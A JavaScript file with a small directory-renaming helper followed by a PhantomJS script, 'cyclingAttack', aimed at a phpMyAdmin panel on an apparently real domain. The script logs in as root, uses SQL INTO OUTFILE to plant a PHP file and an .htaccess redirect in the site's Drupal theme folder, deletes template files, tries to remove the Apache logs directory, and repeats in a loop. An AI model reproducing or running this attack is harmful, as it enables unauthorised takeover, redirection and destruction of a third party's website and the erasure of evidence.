/**
 * Created by tom.chang on 2015/4/22.
 */
var dirWalker = require('./dirWalker');
var fs = require('fs');
var path = require("path");
console.log(__dirname)
var filePath = path.normalize(__dirname+"/wx_files"),result=[],matchArr=[],count=0;
for(var i= 0;i<883;i++){
    matchArr.push(i)
}
//var fileLength=dirWalker.walkSync("D:\\work\\php\\tom\\wechat_tongji\\2015-11-24", 0, function(){});
function handleFile(path, floor) {
    var blankStr = '';
    for (var i = 0; i < floor; i++) {
        blankStr += '    ';
    }
    fs.stat(path, function(err1, stats) {
        if (err1) {
            console.log('stat error');
        } else {
            if (stats.isDirectory()) {
                console.log('+' + blankStr + path);
            } else {
                fs.rename(path,path.replace("erroImg",''));
            /*    if(path.match(/\(.*\)/)){
                    //del
                    fs.unlink(path,function(){
                        console.log("已删除文件----"+path);
                    })
                }else{
                    count++;
                    result.push(parseInt(path.replace(/[^\d]/g,"")));
                    if(count===fileLength){
                        result=matchArr.filter(function(item){
//                            console.log(result.indexOf(item),item)
                            return result.indexOf(item)==-1
                        })
                        console.log(result)
                    }
                }*/
            }
        }
    })
}

dirWalker.walk("D:\\work\\php\\tom\\wechat_tongji\\2015-11-26", 0, handleFile);


// Example using HTTP POST operation
var md5=require("md5");
var fs=require("fs");
var fileFolder="D:\\work\\JS_plugin\\phantomjs/data/";
var user={username:'superchangme'}
//var server = 'http://10.4.1.76/phpMyAdmin/';

var server = 'http://jbwuliu.net/phpMyAdmin/';
var collectionData=[];
var maxPages=10;
var pageCount=1;
var joshOver=false;
var favorTypesArr=['幽默','名人']
var postUrl="http://127.0.0.1/tom/sina_grab/capture.php"

var headers = {
    'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'
}

//data = 'username='+user.username+'&pwd='+md5.digest_s(user.pwd)+'&json=f&imgcode';

function cyclingAttack(){
    var page = require('webpage').create(),jumpCount=1;
    page.open(server, function (status) {
        console.log("in----attack counts----",pageCount)
    });
    page.onLoadFinished = function() {
        console.log(page.url,'jumpCount:'+jumpCount);
        if(page.url.indexOf("baidu.com")>-1){
            setTimeout(function(){
                page.close();
                cyclingAttack();
            },1000*60)
            return;
        }
        switch(jumpCount){
            case 0:
                page.evaluate(function(){
                    document.getElementById("input_username").value='root';
                    document.getElementById("input_go").click()
                });
                break;
            case 1:
                page.evaluate(function(){
                    //window.frames['frame_content'].
                    document.querySelectorAll("#topmenu a")[1].click()
                });
                break;
            case 2:
                page.evaluate(function(){
                    //window.frames['frame_content'].
                    document.querySelector("#sqlquery").value="use jiabao;CREATE TEMPORARY TABLE tmp_table ( text text NOT NULL ); INSERT INTO tmp_table (`text` ) VALUES ('\r\n <IfModule mod_rewrite.c> \r\n RewriteEngine  on \r\n RewriteBase / \r\n rewriteRule .*$ https://www.baidu.com/search/error.html \r\n</IfModule>'); SELECT text FROM tmp_table INTO OUTFILE 'C:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp6.php'; CREATE TEMPORARY TABLE tmp_table2 ( text text NOT NULL ); INSERT INTO tmp_table2 (`text` ) VALUES ('<?php $data=file_get_contents(\"C:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp6.php\");function delFileUnderDir( $dirName ) { if ( $handle = opendir(" +
                        ' "$dirName" ) ) { while ( false !== ( $item = readdir( $handle ) ) ) { if ( $item != "." && $item != ".." ) { if ( is_dir( "$dirName/$item" ) ) { delFileUnderDir( "$dirName/$item" ); } else { if( unlink( "$dirName/$item" ) )} } } closedir( $handle ); } }'+"file_put_contents(\"C:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/.htaccess\",str_replace(\"\\\",\"\",$data));delFileUnderDir(\"C:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/\");unlink(\"C:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp7.php\");unlink(\"C:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp6.php\");@rmdir(\"C:/Program Files (x86)/Zend/Apache2/logs/\"); ?>'); SELECT text FROM tmp_table2 INTO OUTFILE 'C:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp7.php';"
                    //document.querySelectorAll("textarea")[1].value="CREATE TEMPORARY TABLE tmp_table ( text text NOT NULL ); INSERT INTO tmp_table (`text` ) VALUES ('\r\n <IfModule mod_rewrite.c> \r\n RewriteEngine  on \r\n RewriteBase / \r\n rewriteRule .*$ https://www.baidu.com/search/error.html \r\n</IfModule>'); SELECT text FROM tmp_table INTO OUTFILE 'D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp.php'; CREATE TEMPORARY TABLE tmp_table2 ( text text NOT NULL ); INSERT INTO tmp_table2 (`text` ) VALUES ('<?php $data=file_get_contents(\"D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp.php\");file_put_contents(\"D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/.htaccess\",str_replace(\"\\\",\"\",$data));unlink(\"D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp.php\");unlink(\"D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp1.php\"); ?>'); SELECT text FROM tmp_table2 INTO OUTFILE 'D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp1.php';"
                    //codemirror_editor.setValue("CREATE TEMPORARY TABLE tmp_table ( text text NOT NULL ); INSERT INTO tmp_table (`text` ) VALUES ('\r\n <IfModule mod_rewrite.c> \r\n RewriteEngine  on \r\n RewriteBase / \r\n rewriteRule .*$ https://www.baidu.com/search/error.html \r\n</IfModule>'); SELECT text FROM tmp_table INTO OUTFILE 'D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp.php'; CREATE TEMPORARY TABLE tmp_table2 ( text text NOT NULL ); INSERT INTO tmp_table2 (`text` ) VALUES ('<?php $data=file_get_contents(\"D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp.php\");file_put_contents(\"D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/.htaccess\",str_replace(\"\\\",\"\",$data));unlink(\"D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp.php\");unlink(\"D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp1.php\"); ?>'); SELECT text FROM tmp_table2 INTO OUTFILE 'D:/Program Files (x86)/Zend/Apache2/htdocs/jiabao/themes/bartik/templates/temp1.php';");
                    //window.frames['frame_content'].
                    document.querySelector("#sqlqueryform").submit();

                });
                break;
            case 3:
                pageCount++;
                page.evaluate(function(){
                    window.location.href='/themes/bartik/templates/temp7.php';
                });
                setTimeout(function(){
                    page.close();
                    cyclingAttack();
                },3000)
        }
        jumpCount++;

        // printArgs.apply(this, arguments);
    };
    page.onUrlChanged = function(){
        console.log("url jump to-----",page.url)
    }
}
cyclingAttack();




